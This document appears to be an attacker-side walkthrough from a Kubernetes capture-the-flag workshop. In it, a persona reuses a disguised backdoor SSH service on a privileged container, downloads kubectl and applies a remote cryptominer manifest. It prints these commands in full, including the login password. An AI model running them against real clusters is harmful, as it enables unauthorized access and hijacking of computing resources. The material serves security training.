# Persistence: Scenario 2 Attack

## Backstory

### Name: __Red__

* Opportunist
* Easy money via crypto-mining
* Uses automated scans of web IP space looking for known exploits and vulnerabilities

### Motivations

* __Red__ notices that public access to the cluster is gone and the cryptominers have stopped reporting in
* __Red__ is excited to discover that the SSH server they left behind is still active

## Re-establishing a Foothold

__Red__ reconnects to the cluster using the SSH service disguised as a *metrics-server* on the cluster. While having access to an individual container may not seem like much of a risk at first glance, this container has two characteristics that make it very dangerous:  

* There is a service account associated with the container which has been granted access to all kubernetes APIs
* The container is running with a privileged security context which grants it direct access to the host OS

## Deploying Miners

Connect to the cluster via SSH:
```console
echo "SSH password is: Sup3r_S3cr3t_P@ssw0rd"
ssh root@<service IP from attack 1> -p 8080
```

Let's redownload kubectl and create our miner:
```console
apk update; apk add curl
cd /usr/local/bin; curl -LO "https://dl.k8s.io/release/$(curl -L -s https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl"; chmod 555 kubectl
export KUBERNETES_SERVICE_HOST=kubernetes.default.svc
export KUBERNETES_SERVICE_PORT=443
kubectl apply -f https://raw.githubusercontent.com/azure/aks-ctf/refs/heads/main/workshop/scenario_1/bitcoinero.yaml
```

Verify that the pod is running:
```console
kubectl get pods -n dev
```

Time for some celebratory pizza!